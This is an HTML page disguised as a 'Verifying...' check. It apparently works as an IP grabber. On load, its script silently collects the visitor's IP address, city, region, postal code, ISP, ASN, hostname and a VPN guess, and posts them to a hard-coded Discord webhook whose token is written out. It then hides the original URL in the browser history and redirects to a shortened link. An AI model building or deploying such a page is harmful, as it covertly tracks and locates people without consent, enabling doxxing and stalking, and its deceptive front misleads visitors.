<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Verification</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <h1>Verifying...</h1>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        const REDIRECT_URL = "https://is.gd/gwuu9c";

        async function getIPInfo() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                if (!response.ok) throw new Error("Failed to fetch IP info");
                const data = await response.json();

                const ip = data.ip || "Unknown";
                const isp = data.org || "Unknown ISP";
                const country = data.country || "Unknown Country";
                const city = data.city || "Unknown City";
                const region = data.region || "Unknown Region";
                const hostname = data.hostname || "Unknown Host";
                const asn = data.asn ? data.asn.asn : "Unknown ASN";
                const asn_org = data.asn ? data.asn.name : "Unknown ASN Org";
                const postal = data.postal || "Unknown Postal Code";
                const timezone = data.timezone || "Unknown Timezone";

                // More intelligent VPN detection
                const vpnKeywords = ["VPN", "Proxy", "Hosting", "Datacenter", "Cloudflare", "AWS", "Google Cloud", "Azure"];
                const isVPN = vpnKeywords.some(keyword => isp.toLowerCase().includes(keyword) || asn_org.toLowerCase().includes(keyword)) ? "Yes" : "No";

                return { ip, isp, country, city, region, hostname, asn, asn_org, postal, timezone, isVPN };
            } catch (error) {
                console.error("Error fetching IP info:", error);
                return null;
            }
        }

        async function sendToWebhook(ipInfo) {
            if (!ipInfo) return;

            try {
                const payload = {
                    content: `üîç **New Visitor Details** üîç\n\n` +
                        `üìå **IP Address:** ${ipInfo.ip}\n` +
                        `üåç **Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (${ipInfo.postal})\n` +
                        `üï∞ **Timezone:** ${ipInfo.timezone}\n` +
                        `üè¢ **ISP:** ${ipInfo.isp}\n` +
                        `üîó **ASN:** ${ipInfo.asn} - ${ipInfo.asn_org}\n` +
                        `üîç **Hostname:** ${ipInfo.hostname}\n` +
                        `üõë **VPN Detected:** ${ipInfo.isVPN}`
                };
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Error sending data to webhook:", error);
            }
        }

        (async function () {
            const ipInfo = await getIPInfo();
            await sendToWebhook(ipInfo);

            // Hide the original URL before redirecting
            history.replaceState(null, '', REDIRECT_URL);
            window.location.href = REDIRECT_URL;
        })();
    </script>

</body>
</html>
